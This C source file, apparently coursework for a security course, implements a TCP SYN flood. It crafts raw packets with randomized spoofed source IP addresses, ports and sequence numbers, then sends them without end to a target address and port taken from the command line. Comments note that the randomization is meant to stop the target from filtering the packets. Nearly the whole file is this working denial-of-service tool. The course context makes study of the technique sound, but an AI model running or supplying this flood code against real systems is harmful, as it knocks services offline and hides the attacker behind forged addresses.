/*/----------------

 https://www.binarytides.com/raw-sockets-c-code-linux/

and the code from rawip_example.c from Tutorial4 coded by jiaziyi

Done in colab with Joaquin Castanon for the course INF473X

*/

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<time.h>
#include <unistd.h>//For close()

#include "header.h"

#define DEST_IP "127.0.0.1" //set your destination ip here
#define DEST_PORT 30000 //set the destination port here
#define TEST_STRING "You are being flooded" //a test string as packet payload




int main(int argc, char *argv[]) {
    //Generate aleatory seed based on time
    srand(time(NULL));
    
    if(argc!=3) {
        printf("Insert [destination ip] and [destination port]\n");
        return 0;
    }

    char packet[65536], *data;//I don`t know if we need all this space for it
	char data_string[] = TEST_STRING;
	memset(packet, 0, 65536);

    //Data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
	//fill the data section
	strncpy(data, data_string, strlen(data_string));

    //IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

    //Filling IP Header
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = 0; //Still don`t know what to do with that
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;//  TCP protocol
	iph->saddr = random_ip();
	iph->daddr = inet_addr(argv[1]);
    iph->check = 0;

     //Calculating the IP check sum
	iph->check = checksum((unsigned short *) packet, iph->tot_len);


	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	struct pseudo_tcp_header psh; //pseudo header

    //Filling the TCP Header
    tcph->source = htons(rand());//Random Source port, it does boundary |limitations| automatically
    tcph->dest = htons(atoi(argv[2]));
    tcph->seq = htonl(rand());//Random to not let the host stop our packages for having an exact seq number
    tcph->syn=1;//Starting connexion
    tcph->fin = 0;
    tcph->rst=0;//If we don`t put it its going to be set to zero automatically
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->ack_seq = 0;
    tcph->urg=0;
    tcph->window = htons(5840);//Maximum window size allowed
    tcph->doff=5;//TCP header size
    tcph->check = 0;
	tcph->urg_ptr = 0;

    //Fillin the Pseudo Header
    psh.source_address=iph->saddr;
    psh.dest_address=iph->daddr;
    psh.protocol=iph->protocol;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
    psh.placeholder = 0;

    //Calculate checksum -> from binarytides.com
    int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr) + strlen(data);
	char *pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_tcp_header));
	memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	
	tcph->check = checksum( (unsigned short*) pseudogram , psize);

    //Check errors - Sup after
    if(iph->saddr == -1)
        puts("Invalid source IP address");
    if(iph->daddr == -1)
        puts("Invalid destination IP address");
    if(tcph->dest == 0)
        puts("Invalid destination port");

   //Creating destination socket address
    struct sockaddr_in t;
    t.sin_addr.s_addr=iph->daddr;
    t.sin_family=AF_INET;
    t.sin_port=tcph->dest;


	//-------------------------------------------------------------------------------
	printf("\n");
    printf( "IP Header\n");
    printf( "   |-IP Version        : %d\n",(unsigned int)iph->version);
    printf( "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
    printf( "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
    printf( "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
    printf( "   |-Identification    : %d\n",ntohs(iph->id));
    //fprintf(logfile , "   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
    //fprintf(logfile , "   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
    //fprintf(logfile , "   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
    printf("   |-TTL      : %d\n",(unsigned int)iph->ttl);
    printf("   |-Protocol : %d\n",(unsigned int)iph->protocol);
    printf("   |-Checksum : %d\n",ntohs(iph->check));
    printf("   |-Source IP        : (Randomized)\n");
    printf("   |-Destination IP   : %s\n" , argv[1]);
    //-----------------------------------------------------------------------------------
    printf(  "\n");
    printf(  "TCP Header\n");
    printf(  "   |-Source Port      : %u\n",ntohs(tcph->source));
    printf(  "   |-Destination Port : %u\n",ntohs(tcph->dest));
    printf(  "   |-Sequence Number    : %u\n",ntohl(tcph->seq));
    printf(  "   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
    printf(  "   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
    //fprint(logfile , "   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
    //fprint(logfile , "   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
    printf(  "   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
    printf(  "   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
    printf(  "   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
    printf(  "   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
    printf(  "   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
    printf(  "   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
    printf(  "   |-Window         : %d\n",ntohs(tcph->window));
    printf(  "   |-Checksum       : %d\n",ntohs(tcph->check));
    printf(  "   |-Urgent Pointer : %d\n",tcph->urg_ptr);
    printf(  "\n");
    printf(  "                        DATA Dump                         ");
    printf(  "\n");

    //---------------------------------------------------------------



    //Flood Initiating - we create a bunch of Sockets and fill them with different IP Packages
    while(1){
        //Flood Step----------------------------------------------------------------------------
        int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);//Don`t know if we start the socket inside, maybe it`s worth it to create separate threads in order to have multiple sockets
        
        int hincl = 1;                  /* 1 = on, 0 = off */
        setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
        if(fd < 0){ puts("Error creating raw socket "); exit(1);}

         // Send packet
        if (sendto(fd, packet, iph->tot_len, 0, (const struct sockaddr *)&t, sizeof(const struct sockaddr)) == -1){
            puts("Not able to send package");
        }//I dont know if the correct size should be 65536 or the total length in the IP package or another thing
        else{
            printf ("Packet Sent. Length : %d , Message : %s\n", iph->tot_len, data);
        }
        
        close(fd);       
        //--------------------------------------------------------------------------------------
       
        // Build another packet
        iph->saddr = random_ip();//Source IP
        psh.source_address=iph->saddr;
        tcph->source = rand();//Random Port
        tcph->seq = rand();//Random Sequence number for the package
        tcph->check = 0;

        //recalculating Checksum	
	    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_tcp_header));
	    memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    	tcph->check = checksum( (unsigned short*) pseudogram , psize);
        //---------------------------------------------------------------------------------------------------
        //To see what is really happening uncomment the ligne bellow :)
        //usleep(300000); //For debuguing purposes
    }
    return 0;
}